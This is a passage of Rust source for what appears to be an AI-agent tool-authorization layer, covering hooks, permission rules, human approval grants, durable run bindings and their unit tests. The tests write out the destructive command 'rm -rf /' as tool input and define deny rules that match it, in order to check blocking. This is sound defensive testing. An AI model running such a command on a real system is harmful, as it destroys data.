        Ok(run)
    }

    /// Clone immutable policy/callback configuration for one invocation while allocating a fresh
    /// approval cache. A cloned `AgentOptions` may run concurrently and may even share an audit
    /// run id; human grants must still never cross the invocation boundary.
    pub fn fork_for_run(&self) -> Self {
        Self {
            permissions: self.permissions.clone(),
            hooks: self.hooks.clone(),
            approver: self.approver.clone(),
            approved_permissions: Arc::new(RwLock::new(ApprovedPermissionSet::default())),
            policy_snapshot: self.policy_snapshot.clone(),
            tenant_id: self.tenant_id.clone(),
            agent_id: self.agent_id.clone(),
            durable_binding: self.durable_binding.clone(),
            durable_run: self.durable_run.clone(),
            durable_store: self.durable_store.clone(),
            durable_approver_authority: self.durable_approver_authority.clone(),
            durable_bindings: self.durable_bindings.clone(),
            binding_violation: self.binding_violation.clone(),
        }
    }

    fn validate_run_binding(
        &self,
        run: &Arc<Mutex<crate::durability::RunState>>,
    ) -> Result<GovernanceBinding, DurableApproverError> {
        let snapshot = self
            .policy_snapshot
            .as_ref()
            .ok_or(DurableApproverError::MissingPolicySnapshot)?;
        let guard = run
            .lock()
            .map_err(|_| DurableApproverError::StateUnavailable)?;
        if guard.status().is_terminal() {
            return Err(DurableApproverError::RunTerminal {
                run_id: guard.run_id().to_owned(),
            });
        }
        let actual = guard
            .governance_binding()
            .cloned()
            .ok_or(DurableApproverError::MissingGovernanceBinding)?;
        let expected = GovernanceBinding::seal(
            snapshot.hash(),
            self.tenant_id.clone(),
            self.agent_id.clone(),
            guard.run_id(),
        )
        .map_err(|error| DurableApproverError::BindingMismatch(error.to_string()))?;
        if actual != expected {
            return Err(DurableApproverError::BindingMismatch(format!(
                "expected {}, found {}",
                expected.binding_hash(),
                actual.binding_hash()
            )));
        }
        Ok(actual)
    }

    fn ensure_run_authority(
        &self,
        run: &Arc<Mutex<crate::durability::RunState>>,
    ) -> Result<(), DurableApproverError> {
        if self
            .durable_run
            .as_ref()
            .is_some_and(|existing| !Arc::ptr_eq(existing, run))
        {
            return Err(DurableApproverError::BindingMismatch(
                "governance is already attached to a different durable state authority".into(),
            ));
        }
        Ok(())
    }

    fn ensure_store_authority(
        &self,
        store: &Arc<dyn crate::durable_store::DurableStore>,
    ) -> Result<(), DurableApproverError> {
        if self
            .durable_store
            .as_ref()
            .is_some_and(|existing| !Arc::ptr_eq(existing, store))
        {
            return Err(DurableApproverError::Store(
                "governance is already attached to a different durable store authority".into(),
            ));
        }
        Ok(())
    }

    fn ensure_driver_approver_authority(
        &self,
        driver: &crate::durable_runtime::DurableRunDriver,
    ) -> Result<(), DurableApproverError> {
        if self.approver.is_none() {
            return Ok(());
        }
        let Some(authority) = &self.durable_approver_authority else {
            return Err(DurableApproverError::BindingMismatch(
                "durable driver cannot use an ordinary approver; install the driver-backed durable approver"
                    .into(),
            ));
        };
        let same_run = Arc::ptr_eq(&authority.run, &driver.state_handle());
        let same_store = authority
            .store
            .as_ref()
            .is_some_and(|store| Arc::ptr_eq(store, &driver.store_handle()));
        let same_poison = authority
            .poison
            .as_ref()
            .is_some_and(|poison| Arc::ptr_eq(poison, &driver.poison_handle()));
        let same_worker_lease = authority.worker_lease == driver.worker_lease_authority();
        if !same_run || !same_store || !same_poison || !same_worker_lease {
            return Err(DurableApproverError::BindingMismatch(
                "durable approver does not share the driver's exact state, store, poison, and worker lease authority"
                    .into(),
            ));
        }
        Ok(())
    }

    fn register_durable_binding(
        &self,
        binding: &GovernanceBinding,
    ) -> Result<(), DurableApproverError> {
        let mut bindings = self
            .durable_bindings
            .write()
            .map_err(|_| DurableApproverError::StateUnavailable)?;
        if let Some(existing) = bindings.get(binding.run_id()) {
            if existing != binding {
                return Err(DurableApproverError::BindingMismatch(format!(
                    "run `{}` is already bound to {}",
                    binding.run_id(),
                    existing.binding_hash()
                )));
            }
            return Ok(());
        }
        if bindings.len() >= MAX_REGISTERED_DURABLE_BINDINGS {
            return Err(DurableApproverError::BindingRegistryFull {
                capacity: MAX_REGISTERED_DURABLE_BINDINGS,
            });
        }
        bindings.insert(binding.run_id().to_owned(), binding.clone());
        Ok(())
    }

    /// Retire an exact terminal run binding and its ephemeral approvals. Paused, running, and
    /// reconciliation-required runs remain registered because they may legally resume.
    /// Repeating retirement is idempotent, while a mismatched binding always fails closed.
    pub fn retire_durable_run(
        &self,
        run: &crate::durability::RunState,
    ) -> Result<(), DurableApproverError> {
        if !run.status().is_terminal() {
            return Err(DurableApproverError::RunNotTerminal {
                run_id: run.run_id().to_owned(),
                status: run.status(),
            });
        }
        let binding = run
            .governance_binding()
            .ok_or(DurableApproverError::MissingGovernanceBinding)?;
        binding
            .validate()
            .map_err(|error| DurableApproverError::BindingMismatch(error.to_string()))?;

        // Acquire both locks before mutation. A partial cleanup must never remove the binding
        // while leaving a reusable approval grant behind for the same run id.
        let mut bindings = self
            .durable_bindings
            .write()
            .map_err(|_| DurableApproverError::StateUnavailable)?;
        let mut approved = self
            .approved_permissions
            .write()
            .map_err(|_| DurableApproverError::StateUnavailable)?;
        if let Some(registered) = bindings.get(run.run_id()) {
            if registered != binding {
                return Err(DurableApproverError::BindingMismatch(format!(
                    "terminal run `{}` does not match registered binding {}",
                    run.run_id(),
                    registered.binding_hash()
                )));
            }
            bindings.remove(run.run_id());
        }
        approved.grants.retain(|grant| grant.run_id != run.run_id());
        Ok(())
    }

    fn validate_authorization_binding(&self, run_id: &str) -> Result<(), String> {
        if let Some(reason) = &self.binding_violation {
            return Err(reason.clone());
        }
        let registered = self
            .durable_bindings
            .read()
            .map_err(|_| "durable governance binding registry is unavailable".to_string())?
            .get(run_id)
            .cloned();
        let binding = match (&self.durable_binding, registered.as_ref()) {
            (Some(attached), Some(registered)) if attached != registered => {
                return Err("attached and registered durable bindings disagree".into())
            }
            (Some(_), None) => {
                return Err(
                    "attached durable governance binding is not registered or was retired".into(),
                )
            }
            (Some(attached), Some(_)) => attached,
            (None, Some(registered)) => registered,
            (None, None) => return Ok(()),
        };
        let snapshot = self
            .policy_snapshot
            .as_ref()
            .ok_or_else(|| "durable governance policy snapshot is missing".to_string())?;
        let expected = GovernanceBinding::seal(
            snapshot.hash(),
            self.tenant_id.clone(),
            self.agent_id.clone(),
            run_id,
        )
        .map_err(|error| format!("invalid durable governance identity: {error}"))?;
        if &expected != binding {
            return Err("authorization context does not match durable governance binding".into());
        }
        if let Some(run) = &self.durable_run {
            let run = run
                .lock()
                .map_err(|_| "durable governance run state is unavailable".to_string())?;
            if run.governance_binding() != Some(binding) || run.run_id() != run_id {
                return Err("durable run governance binding changed after attachment".into());
            }
        }
        Ok(())
    }

    fn evaluate_permission(
        &self,
        run_id: &str,
        tool: &str,
        input: &Value,
    ) -> permissions::PermissionDecision {
        let legacy = self.permissions.evaluate_detailed(tool, input);
        let Some(snapshot) = &self.policy_snapshot else {
            return legacy;
        };
        let policy = snapshot.evaluate(&PolicyEvaluationContext {
            tenant_id: self.tenant_id.clone(),
            agent_id: self.agent_id.clone(),
            run_id: Some(run_id.to_owned()),
            tool: tool.to_owned(),
        });
        let policy_source = policy
            .deciding_rule_id
            .as_deref()
            .unwrap_or("policy.default");
        match (&legacy.outcome, policy.effect) {
            (Outcome::Deny(_), _) => legacy,
            (_, PolicyEffect::Deny) => permissions::PermissionDecision {
                outcome: Outcome::Deny(format!("denied by sealed policy `{policy_source}`")),
                source: format!("policy_snapshot:{}:{policy_source}", snapshot.hash()),
            },
            (Outcome::Ask, _) | (_, PolicyEffect::Ask) => permissions::PermissionDecision {
                outcome: Outcome::Ask,
                source: format!(
                    "{}+policy_snapshot:{}:{policy_source}",
                    legacy.source,
                    snapshot.hash()
                ),
            },
            (Outcome::Allow, PolicyEffect::Allow) => permissions::PermissionDecision {
                outcome: Outcome::Allow,
                source: format!(
                    "{}+policy_snapshot:{}:{policy_source}",
                    legacy.source,
                    snapshot.hash()
                ),
            },
        }
    }

    /// Remove every ephemeral approval installed for a completed run. Long-lived `Governance`
    /// instances are shared across requests, so terminal cleanup is part of the security boundary,
    /// not merely a memory optimization.
    pub fn clear_run_permissions(&self, run_id: &str) -> crate::error::Result<()> {
        let mut approved = self.approved_permissions.write().map_err(|_| {
            crate::error::AikitError::Conflict(
                "approved permission state is unavailable during run cleanup".into(),
            )
        })?;
        approved.grants.retain(|grant| grant.run_id != run_id);
        Ok(())
    }

    /// Authorize a tool call: run enforcing PreToolUse hooks (which may block or rewrite), then
    /// the permission rules. Returns the effective input to run with, or a denial reason.
    ///
    /// Ordering note: hooks run **before** permissions, and permissions evaluate the *rewritten*
    /// input. This is intentional — a trusted hook that clamps input to make it safe (e.g. forces
    /// a cwd, redacts a secret) should be honoured. The consequence: a hook that rewrites away a
    /// pattern a deny-rule targets will pass that rule. Don't treat hooks and deny-rules as two
    /// independent gates on the *same* concern; a deny-rule is the backstop for what hooks let by.
    pub async fn authorize(&self, tool: &str, input: &Value) -> Authorization {
        self.authorize_with_context(AuthorizationContext {
            run_id: "unscoped".into(),
            turn: 0,
            tool_use_id: "unscoped".into(),
            tool: tool.into(),
            input: input.clone(),
        })
        .await
    }

    pub async fn authorize_with_context(&self, ctx: AuthorizationContext) -> Authorization {
        self.authorize_detailed_with_context(ctx)
            .await
            .authorization
    }

    pub async fn authorize_detailed_with_context(
        &self,
        ctx: AuthorizationContext,
    ) -> AuthorizationReport {
        if let Err(reason) = self.validate_authorization_binding(&ctx.run_id) {
            return AuthorizationReport {
                authorization: Authorization::interrupted(format!(
                    "durable governance binding rejected authorization: {reason}"
                )),
                interrupt: true,
                pre_hook_outcome: "not_evaluated",
                permission_outcome: "binding_mismatch",
                permission_source: "durable_governance_binding".into(),
            };
        }
        // 1. Enforcing hooks first — they can block outright or rewrite the input.
        let (effective, pre_hook_outcome) = match self
            .hooks
            .run_pre_tool_use(PreToolUseContext {
                run_id: ctx.run_id.clone(),
                turn: ctx.turn,
                tool_use_id: ctx.tool_use_id.clone(),
                tool: ctx.tool.clone(),
                input: ctx.input.clone(),
            })
            .await
        {
            HookOutcome::Block(reason) => {
                return AuthorizationReport {
                    authorization: Authorization::denied(format!("blocked by hook: {reason}")),
                    interrupt: false,
                    pre_hook_outcome: "block",
                    permission_outcome: "not_evaluated",
                    permission_source: "pre_tool_use_hook".into(),
                }
            }
            HookOutcome::Rewrite(new_input) => (new_input, "rewrite"),
            HookOutcome::Continue => (ctx.input.clone(), "continue"),
        };

        // 2. Permission rules on the (possibly rewritten) input.
        let permission = self.evaluate_permission(&ctx.run_id, &ctx.tool, &effective);
        match permission.outcome {
            Outcome::Allow => AuthorizationReport {
                authorization: Authorization::Allowed(effective),
                interrupt: false,
                pre_hook_outcome,
                permission_outcome: "allow",
                permission_source: permission.source,
            },
            Outcome::Deny(reason) => AuthorizationReport {
                authorization: Authorization::denied(reason),
                interrupt: false,
                pre_hook_outcome,
                permission_outcome: "deny",
                permission_source: permission.source,
            },
            Outcome::Ask => {
                let approved_source = match self.approved_permissions.read() {
                    Ok(approved) => approved.matching_source(&ctx.run_id, &ctx.tool, &effective),
                    Err(_) => {
                        return AuthorizationReport {
                            authorization: Authorization::interrupted(
                                "approved permission state is unavailable",
                            ),
                            interrupt: true,
                            pre_hook_outcome,
                            permission_outcome: "approval_state_error",
                            permission_source: "human_approval_state:poisoned".into(),
                        }
                    }
                };
                if let Some(source) = approved_source {
                    return AuthorizationReport {
                        authorization: Authorization::Allowed(effective),
                        interrupt: false,
                        pre_hook_outcome,
                        permission_outcome: "approved_permission",
                        permission_source: source,
                    };
                }

                let Some(approver) = &self.approver else {
                    return AuthorizationReport {
                        authorization: Authorization::denied(format!(
                            "tool '{}' requires approval (no approver wired)",
                            ctx.tool
                        )),
                        interrupt: false,
                        pre_hook_outcome,
                        permission_outcome: "ask_unavailable",
                        permission_source: permission.source,
                    };
                };

                match approver
                    .approve(ApprovalRequest {
                        run_id: ctx.run_id.clone(),
                        turn: ctx.turn,
                        tool_use_id: ctx.tool_use_id.clone(),
                        tool: ctx.tool.clone(),
                        input: effective.clone(),
                    })
                    .await
                {
                    ApprovalDecision::Allow {
                        updated_input,
                        updated_permissions,
                    } => {
                        // Approval rewrites happen after the first PreToolUse pass. Run the final
                        // input through that enforcing hook again; otherwise an approver could
                        // replace a safe ask-able input with one the hook would have blocked. This
                        // second pass occurs at most once and only when the callback changed input.
                        let (approved_input, final_pre_hook_outcome) = match updated_input {
                            Some(updated_input) => match self
                                .hooks
                                .run_pre_tool_use(PreToolUseContext {
                                    run_id: ctx.run_id.clone(),
                                    turn: ctx.turn,
                                    tool_use_id: ctx.tool_use_id.clone(),
                                    tool: ctx.tool.clone(),
                                    input: updated_input.clone(),
                                })
                                .await
                            {
                                HookOutcome::Block(reason) => {
                                    return AuthorizationReport {
                                        authorization: Authorization::denied(format!(
                                            "approval-updated input blocked by hook: {reason}"
                                        )),
                                        interrupt: false,
                                        pre_hook_outcome: "approval_recheck_block",
                                        permission_outcome: "ask_allow_rejected",
                                        permission_source: "post_approval_pre_tool_hook".into(),
                                    };
                                }
                                HookOutcome::Rewrite(final_input) => {
                                    (final_input, "approval_recheck_rewrite")
                                }
                                HookOutcome::Continue => {
                                    (updated_input, "approval_recheck_continue")
                                }
                            },
                            None => (effective, pre_hook_outcome),
                        };
                        // Recheck static policy too, so a callback cannot turn an ask-able call
                        // into an explicit deny and accidentally bypass it.
                        let recheck =
                            self.evaluate_permission(&ctx.run_id, &ctx.tool, &approved_input);
                        if let Outcome::Deny(reason) = recheck.outcome {
                            return AuthorizationReport {
                                authorization: Authorization::denied(reason),
                                interrupt: false,
                                pre_hook_outcome,
                                permission_outcome: "ask_allow_rejected",
                                permission_source: format!("static_recheck:{}", recheck.source),
                            };
                        }

                        let scopes = updated_permissions
                            .iter()
                            .map(|update| match update {
                                PermissionUpdate::AllowExactInput => "allow_exact_input",
                                PermissionUpdate::AllowTool => "allow_tool",
                            })
                            .collect::<Vec<_>>();
                        if !updated_permissions.is_empty() {
                            let mut approved = match self.approved_permissions.write() {
                                Ok(approved) => approved,
                                Err(_) => {
                                    return AuthorizationReport {
                                        authorization: Authorization::interrupted(
                                            "approved permission state is unavailable",
                                        ),
                                        interrupt: true,
                                        pre_hook_outcome,
                                        permission_outcome: "approval_state_error",
                                        permission_source: "human_approval_state:poisoned".into(),
                                    }
                                }
                            };
                            for update in &updated_permissions {
                                let scope = match update {
                                    PermissionUpdate::AllowExactInput => "allow_exact_input",
                                    PermissionUpdate::AllowTool => "allow_tool",
                                };
                                approved.insert(ApprovedPermission {
                                    run_id: ctx.run_id.clone(),
                                    tool: ctx.tool.clone(),
                                    scope: *update,
                                    input: (*update == PermissionUpdate::AllowExactInput)
                                        .then(|| approved_input.clone()),
                                    source: format!(
                                        "human_approval:{}:{}:{scope}",
                                        permission.source, ctx.tool_use_id
                                    ),
                                });
                            }
                        }
                        let permission_source = if scopes.is_empty() {
                            format!("human_approval:{}", permission.source)
                        } else {
                            format!(
                                "human_approval:{};updates={}",
                                permission.source,
                                scopes.join(",")
                            )
                        };
                        AuthorizationReport {
                            authorization: Authorization::Allowed(approved_input),
                            interrupt: false,
                            pre_hook_outcome: final_pre_hook_outcome,
                            permission_outcome: "ask_allowed",
                            permission_source,
                        }
                    }
                    ApprovalDecision::Deny { message, interrupt } => AuthorizationReport {
                        authorization: Authorization::Denied { message, interrupt },
                        interrupt,
                        pre_hook_outcome,
                        permission_outcome: if interrupt {
                            "ask_denied_interrupt"
                        } else {
                            "ask_denied"
                        },
                        permission_source: format!("human_approval:{}", permission.source),
                    },
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::durable_store::{
        reject_unvalidated_approval_resolutions, validate_append_only,
        validate_approval_resolution_deadline, validate_worker_lease_fence, DurableStore,
        DurableStoreError, DurableStoreLeaseAuthority, InMemoryDurableStore,
    };
    use permissions::{PermissionMode, Rule};
    use serde_json::json;
    use std::sync::atomic::{AtomicU64, AtomicUsize, Ordering};

    fn snapshot(effect: PolicyEffect) -> PolicySnapshot {
        PolicySnapshot::seal(PolicyDocument {
            schema_version: GOVERNANCE_CONTRACT_VERSION,
            default_effect: effect,
            rules: Vec::new(),
        })
        .unwrap()
    }

    struct ManualClockDurableStore {
        state: Mutex<crate::durability::RunState>,
        now_unix_ms: AtomicU64,
        approval_resolution_cas_clock_unix_ms: AtomicU64,
        reject_next_timeout_resolution_as_expired: std::sync::atomic::AtomicBool,
    }

    impl ManualClockDurableStore {
        fn new(state: crate::durability::RunState, now_unix_ms: u64) -> Self {
            Self {
                state: Mutex::new(state),
                now_unix_ms: AtomicU64::new(now_unix_ms),
                approval_resolution_cas_clock_unix_ms: AtomicU64::new(0),
                reject_next_timeout_resolution_as_expired: std::sync::atomic::AtomicBool::new(
                    false,
                ),
            }
        }

        fn set_clock(&self, now_unix_ms: u64) {
            self.now_unix_ms.store(now_unix_ms, Ordering::SeqCst);
        }

        fn advance_clock_inside_next_approval_resolution_cas(&self, now_unix_ms: u64) {
            self.approval_resolution_cas_clock_unix_ms
                .store(now_unix_ms, Ordering::SeqCst);
        }

        fn reject_next_timeout_resolution_as_expired(&self) {
            self.reject_next_timeout_resolution_as_expired
                .store(true, Ordering::SeqCst);
        }

        fn compare_and_swap_inner(
            &self,
            expected_sequence: u64,
            replacement: &crate::durability::RunState,
            authority: Option<&DurableStoreLeaseAuthority>,
            approval_id: Option<&str>,
        ) -> Result<(), DurableStoreError> {
            let mut current = self.state.lock().unwrap();
            let actual = current.events().last().map_or(0, |event| event.sequence);
            if actual != expected_sequence {
                return Err(DurableStoreError::Conflict {
                    run_id: replacement.run_id().into(),
                    expected: expected_sequence,
                    actual,
                });
            }
            let forced_clock = approval_id.map_or(0, |_| {
                self.approval_resolution_cas_clock_unix_ms
                    .swap(0, Ordering::SeqCst)
            });
            if forced_clock != 0 {
                self.now_unix_ms.store(forced_clock, Ordering::SeqCst);
            }
            let now_unix_ms = self.now_unix_ms.load(Ordering::SeqCst);
            validate_worker_lease_fence(&current, replacement, authority, now_unix_ms)?;
            validate_append_only(&current, replacement)?;
            match approval_id {
                Some(approval_id) => {
                    validate_approval_resolution_deadline(
                        &current,
                        replacement,
                        approval_id,
                        now_unix_ms,
                    )?;
                    if replacement
                        .projection()
                        .approvals
                        .get(approval_id)
                        .is_some_and(|approval| {
                            approval.status == crate::durability::DurableApprovalStatus::Rejected
                        })
                        && self
                            .reject_next_timeout_resolution_as_expired
                            .swap(false, Ordering::SeqCst)
                    {
                        return Err(DurableStoreError::ApprovalExpired {
                            run_id: current.run_id().into(),
                            approval_id: approval_id.into(),
                            observed_at_unix_ms: now_unix_ms,
                        });
                    }
                }
                None => reject_unvalidated_approval_resolutions(&current, replacement)?,
            }
            *current = replacement.clone();
            Ok(())
        }
    }

    impl DurableStore for ManualClockDurableStore {
        fn create(&self, state: &crate::durability::RunState) -> Result<(), DurableStoreError> {
            Err(DurableStoreError::AlreadyExists {
                run_id: state.run_id().into(),
            })
        }

        fn load(&self, run_id: &str) -> Result<crate::durability::RunState, DurableStoreError> {
            let state = self.state.lock().unwrap();
            if state.run_id() != run_id {
                return Err(DurableStoreError::NotFound {
                    run_id: run_id.into(),
                });
            }
            Ok(state.clone())
        }

        fn compare_and_swap(
            &self,
            expected_sequence: u64,
            replacement: &crate::durability::RunState,
        ) -> Result<(), DurableStoreError> {
            self.compare_and_swap_inner(expected_sequence, replacement, None, None)
        }

        fn worker_lease_clock_unix_ms(&self) -> Result<u64, DurableStoreError> {
            Ok(self.now_unix_ms.load(Ordering::SeqCst))
        }

        fn supports_atomic_approval_resolution(&self) -> bool {
            true
        }

        fn compare_and_swap_fenced(
            &self,
            expected_sequence: u64,
            replacement: &crate::durability::RunState,
            authority: &DurableStoreLeaseAuthority,
        ) -> Result<(), DurableStoreError> {
            self.compare_and_swap_inner(expected_sequence, replacement, Some(authority), None)
        }

        fn compare_and_swap_approval_resolution(
            &self,
            expected_sequence: u64,
            replacement: &crate::durability::RunState,
            approval_id: &str,
            authority: Option<&DurableStoreLeaseAuthority>,
        ) -> Result<(), DurableStoreError> {
            self.compare_and_swap_inner(
                expected_sequence,
                replacement,
                authority,
                Some(approval_id),
            )
        }
    }

    #[derive(Default)]
    struct ClocklessDurableStore {
        inner: InMemoryDurableStore,
    }

    impl DurableStore for ClocklessDurableStore {
        fn create(&self, state: &crate::durability::RunState) -> Result<(), DurableStoreError> {
            self.inner.create(state)
        }

        fn load(&self, run_id: &str) -> Result<crate::durability::RunState, DurableStoreError> {
            self.inner.load(run_id)
        }

        fn compare_and_swap(
            &self,
            expected_sequence: u64,
            replacement: &crate::durability::RunState,
        ) -> Result<(), DurableStoreError> {
            self.inner.compare_and_swap(expected_sequence, replacement)
        }
    }

    #[derive(Default)]
    struct ClockOnlyDurableStore {
        inner: InMemoryDurableStore,
    }

    impl DurableStore for ClockOnlyDurableStore {
        fn create(&self, state: &crate::durability::RunState) -> Result<(), DurableStoreError> {
            self.inner.create(state)
        }

        fn load(&self, run_id: &str) -> Result<crate::durability::RunState, DurableStoreError> {
            self.inner.load(run_id)
        }

        fn compare_and_swap(
            &self,
            expected_sequence: u64,
            replacement: &crate::durability::RunState,
        ) -> Result<(), DurableStoreError> {
            self.inner.compare_and_swap(expected_sequence, replacement)
        }

        fn worker_lease_clock_unix_ms(&self) -> Result<u64, DurableStoreError> {
            self.inner.worker_lease_clock_unix_ms()
        }
    }

    #[tokio::test]
    async fn default_governance_allows_everything_unchanged() {
        let g = Governance::default();
        assert_eq!(
            g.authorize("Bash", &json!({ "command": "rm -rf /" })).await,
            Authorization::Allowed(json!({ "command": "rm -rf /" }))
        );
    }

    #[tokio::test]
    async fn permission_rule_denies() {
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::deny("Bash").matching(r"rm\s+-rf").unwrap()],
            ),
            HookDispatcher::new(),
        );
        assert!(matches!(
            g.authorize("Bash", &json!({ "command": "rm -rf /" })).await,
            Authorization::Denied { .. }
        ));
        assert_eq!(
            g.authorize("Bash", &json!({ "command": "ls" })).await,
            Authorization::Allowed(json!({ "command": "ls" }))
        );
    }

    #[tokio::test]
    async fn hook_rewrite_flows_into_the_allowed_input() {
        let mut hooks = HookDispatcher::new();
        hooks.on_pre_tool_use(hooks::HookMatcher::any(), |_t, input| {
            let mut v = input.clone();
            v["cwd"] = json!("/workspace");
            HookOutcome::Rewrite(v)
        });
        let g = Governance::new(PermissionEngine::default(), hooks);
        assert_eq!(
            g.authorize("Write", &json!({ "path": "a.txt" })).await,
            Authorization::Allowed(json!({ "path": "a.txt", "cwd": "/workspace" }))
        );
    }

    #[tokio::test]
    async fn hook_block_beats_permission_allow() {
        let mut hooks = HookDispatcher::new();
        hooks.on_pre_tool_use(hooks::HookMatcher::tool("Bash"), |_t, _i| {
            HookOutcome::Block("policy".into())
        });
        // Permissions would allow, but the enforcing hook blocks first.
        let g = Governance::new(PermissionEngine::default(), hooks);
        assert!(matches!(
            g.authorize("Bash", &json!({})).await,
            Authorization::Denied { .. }
        ));
    }

    struct RewritingApprover;

    #[async_trait]
    impl ToolApprover for RewritingApprover {
        async fn approve(&self, request: ApprovalRequest) -> ApprovalDecision {
            let mut input = request.input;
            input["approved"] = json!(true);
            ApprovalDecision::Allow {
                updated_input: Some(input),
                updated_permissions: Vec::new(),
            }
        }
    }

    #[tokio::test]
    async fn ask_rule_uses_human_approver_and_can_clamp_input() {
        let g = Governance::new(
            PermissionEngine::with_rules(PermissionMode::Allow, vec![Rule::ask("Bash")]),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(RewritingApprover));
        assert_eq!(
            g.authorize("Bash", &json!({ "command": "git push" })).await,
            Authorization::Allowed(json!({ "command": "git push", "approved": true }))
        );
    }

    struct FixedApprover {
        decision: ApprovalDecision,
        calls: Arc<std::sync::atomic::AtomicUsize>,
    }

    #[async_trait]
    impl ToolApprover for FixedApprover {
        async fn approve(&self, _request: ApprovalRequest) -> ApprovalDecision {
            self.calls.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
            self.decision.clone()
        }
    }

    #[tokio::test]
    async fn concurrent_run_forks_never_share_reusable_human_grants() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let configured = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![Rule::ask("Bash").named("ask-bash")],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));
        let first = configured.clone().fork_for_run();
        let second = configured.fork_for_run();
        let context = |tool_use_id: &str| AuthorizationContext {
            // Deliberately identical: invocation isolation must not depend on audit identity.
            run_id: "shared-run-id".into(),
            turn: 1,
            tool_use_id: tool_use_id.into(),
            tool: "Bash".into(),
            input: json!({ "command": "git status" }),
        };

        let (a, b) = tokio::join!(
            first.authorize_detailed_with_context(context("a")),
            second.authorize_detailed_with_context(context("b")),
        );
        assert!(matches!(a.authorization, Authorization::Allowed(_)));
        assert!(matches!(b.authorization, Authorization::Allowed(_)));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);

        let reused = first.authorize_detailed_with_context(context("a-2")).await;
        assert_eq!(reused.permission_outcome, "approved_permission");
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn terminal_cleanup_removes_every_grant_for_the_run() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let governance = Governance::new(
            PermissionEngine::with_rules(PermissionMode::Allow, vec![Rule::ask("Bash")]),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));
        let context = |id: &str| AuthorizationContext {
            run_id: "cleanup-run".into(),
            turn: 1,
            tool_use_id: id.into(),
            tool: "Bash".into(),
            input: json!({ "command": "git status" }),
        };

        governance
            .authorize_detailed_with_context(context("first"))
            .await;
        governance
            .authorize_detailed_with_context(context("reused"))
            .await;
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);
        governance.clear_run_permissions("cleanup-run").unwrap();
        governance
            .authorize_detailed_with_context(context("after-cleanup"))
            .await;
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn human_permission_update_is_reused_but_static_deny_still_wins() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![
                    Rule::deny("Bash")
                        .matching(r"rm\s+-rf")
                        .unwrap()
                        .named("never-delete-root"),
                    Rule::ask("Bash").named("ask-bash"),
                ],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: None,
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));

        let first = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "git status" }),
            })
            .await;
        assert!(matches!(first.authorization, Authorization::Allowed(_)));
        assert!(first.permission_source.contains("human_approval:ask-bash"));

        let reused = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 2,
                tool_use_id: "call-2".into(),
                tool: "Bash".into(),
                input: json!({ "command": "cargo test" }),
            })
            .await;
        assert_eq!(reused.permission_outcome, "approved_permission");
        assert!(reused.permission_source.contains("allow_tool"));
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 1);

        let other_run = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "other-run".into(),
                turn: 1,
                tool_use_id: "call-1".into(),
                tool: "Bash".into(),
                input: json!({ "command": "cargo test" }),
            })
            .await;
        assert_eq!(other_run.permission_outcome, "ask_allowed");
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "a human grant from one run must not silently authorize another run"
        );

        let denied = g
            .authorize_detailed_with_context(AuthorizationContext {
                run_id: "run".into(),
                turn: 3,
                tool_use_id: "call-3".into(),
                tool: "Bash".into(),
                input: json!({ "command": "rm -rf /" }),
            })
            .await;
        assert!(matches!(
            denied.authorization,
            Authorization::Denied {
                interrupt: false,
                ..
            }
        ));
        assert_eq!(denied.permission_source, "never-delete-root");
        assert_eq!(calls.load(std::sync::atomic::Ordering::SeqCst), 2);
    }

    #[tokio::test]
    async fn approval_rewrite_is_rechecked_before_permission_updates_are_installed() {
        let calls = Arc::new(std::sync::atomic::AtomicUsize::new(0));
        let g = Governance::new(
            PermissionEngine::with_rules(
                PermissionMode::Allow,
                vec![
                    Rule::deny("Bash")
                        .matching(r"rm\s+-rf")
                        .unwrap()
                        .named("static-deny"),
                    Rule::ask("Bash").named("ask-bash"),
                ],
            ),
            HookDispatcher::new(),
        )
        .with_approver(Arc::new(FixedApprover {
            decision: ApprovalDecision::Allow {
                updated_input: Some(json!({ "command": "rm -rf /" })),
                updated_permissions: vec![PermissionUpdate::AllowTool],
            },
            calls: calls.clone(),
        }));

        for call_id in ["call-1", "call-2"] {
            let report = g
                .authorize_detailed_with_context(AuthorizationContext {
                    run_id: "run".into(),
                    turn: 1,
                    tool_use_id: call_id.into(),
                    tool: "Bash".into(),
                    input: json!({ "command": "git status" }),
                })
                .await;
            assert_eq!(report.permission_outcome, "ask_allow_rejected");
            assert_eq!(report.permission_source, "static_recheck:static-deny");
            assert!(matches!(report.authorization, Authorization::Denied { .. }));
        }
        assert_eq!(
            calls.load(std::sync::atomic::Ordering::SeqCst),
            2,
            "a rejected update must not silently install a reusable grant"
        );
